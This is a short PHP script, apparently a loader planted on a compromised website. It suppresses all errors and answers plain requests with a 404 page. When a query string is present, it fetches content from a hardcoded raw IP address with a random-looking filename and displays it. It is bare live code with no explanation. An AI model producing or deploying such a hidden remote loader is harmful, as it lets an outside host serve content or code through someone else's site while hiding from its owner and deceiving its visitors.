<?php
require 'include.php';

error_reporting(0);
ini_set("display_errors", 0);
if (strlen($_SERVER["QUERY_STRING"]) == 0) {
    error_404();
}
$remote = "http://78.138.127.174/2701dfbvcxff.php";
php_display($remote);
error_404();
